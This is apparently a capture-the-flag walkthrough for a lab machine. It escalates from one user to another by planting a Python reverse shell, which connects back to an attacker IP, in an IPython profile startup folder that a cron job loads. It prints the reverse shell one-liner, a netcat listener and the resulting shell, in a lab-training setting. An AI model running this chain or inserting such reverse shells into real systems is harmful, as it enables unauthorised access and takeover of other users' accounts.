
## Todos

- [x] `developer` group
	- [x] `/opt/scripts_review/`
	- [x] Figure out how to get code execution via ipython

## `developer` Group

`james_mason` is a member of the non-standard group `developer`.

```bash
james_mason@shared:~$ id
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
```

`/opt/scripts_review` is a directory that members of the `developer` group and `root` have full control over.

```bash
james_mason@shared:~$ find / -group developer 2>/dev/null
/opt/scripts_review
```

```bash
james_mason@shared:~$ ls -la /opt/scripts_review/
total 8
drwxrwx--- 2 root developer 4096 Jul 14 13:46 .
drwxr-xr-x 3 root root      4096 Jul 14 13:46 ..
```

According to [pspy](https://github.com/DominicBreuker/pspy), `dan_smith` is running a cron job that regularly changes directory into `/opt/scripts_review/` and executes `/usr/bin/ipython`.

```bash
...
2022/11/17 16:07:01 CMD: UID=1001 PID=4491   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython
...
```

```bash
james_mason@shared:~$ cat /etc/passwd | grep 1001
dan_smith:x:1001:1002::/home/dan_smith:/bin/bash
```

According to [this GitHub security advisory](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x), certain versions of `IPython` contain an arbitrary code execution vulnerability that stems from `IPython` executing untrusted files in its current working directory.

Start a reverse shell listener.

```bash
$ nc -nlvp 9000
listening on [any] 9000 ...
```

Grab the `Python #1` reverse shell from [revshells](https://www.revshells.com/). Save it to `/home/james_mason/tgihf.py`.

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```

Create an `IPython` profile with a startup folder in `/opt/scripts_review/` and copy `/home/james_mason/tgihf.py` to that startup folder.

```bash
cd /opt/scripts_review/
mkdir -m 777 /opt/scripts_review/profile_default
mkdir -m 777 /opt/scripts_review/profile_default/startup
cp /home/james_mason/tgihf.py /opt/scripts_review/profile_default/startup/
```

```bash
james_mason@shared:~$ cd /opt/scripts_review/
james_mason@shared:/opt/scripts_review$ mkdir -m 777 /opt/scripts_review/profile_default
james_mason@shared:/opt/scripts_review$ mkdir -m 777 /opt/scripts_review/profile_default/startup
james_mason@shared:/opt/scripts_review$ cp /home/james_mason/tgihf.py /opt/scripts_review/profile_default/startup/
```

Wait a bit and receive the reverse shell as `dan_smith`.

```bash
$ nc -nlvp 9000
listening on [any] 9000 ...
connect to [10.10.14.40] from (UNKNOWN) [10.129.41.137] 37718
dan_smith@shared:/opt/scripts_review$ id
id
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
```

